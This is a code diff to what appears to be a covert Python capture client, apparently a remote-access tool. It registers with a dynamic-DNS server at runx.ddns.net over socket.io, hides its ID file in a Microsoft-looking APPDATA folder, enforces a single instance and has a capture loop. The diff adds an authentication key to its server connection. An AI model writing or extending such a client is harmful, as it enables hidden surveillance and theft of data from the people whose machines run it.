@@ -17,6 +17,13 @@ if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
 
 # Server Configuration & Client ID
 VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")
+
+try:
+    import client_config
+    CLIENT_KEY = getattr(client_config, "CLIENT_KEY", os.getenv("CLIENT_KEY", "BUILD_KEY_PLACEHOLDER"))
+except ImportError:
+    CLIENT_KEY = os.getenv("CLIENT_KEY", "BUILD_KEY_PLACEHOLDER")
+
 ID_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "run", "run.txt")
 
 os.makedirs(os.path.dirname(ID_PATH), exist_ok=True)
@@ -77,7 +84,7 @@ def capture_loop():
 @sio.event
 def connect():
     print(f"Connected to WebSocket server as {unique_user}")
-    sio.emit("register", {"username": unique_user})
+    sio.emit("register", {"username": unique_user, "auth_token": CLIENT_KEY})
 
 
 @sio.event
@@ -158,7 +165,10 @@ def main():
         try:
             if not sio.connected:
                 sio.connect(
-                    VPS_URL, wait_timeout=10, transports=["websocket", "polling"]
+                    VPS_URL,
+                    wait_timeout=10,
+                    transports=["websocket", "polling"],
+                    auth={"token": CLIENT_KEY},
                 )
         except Exception:
             pass
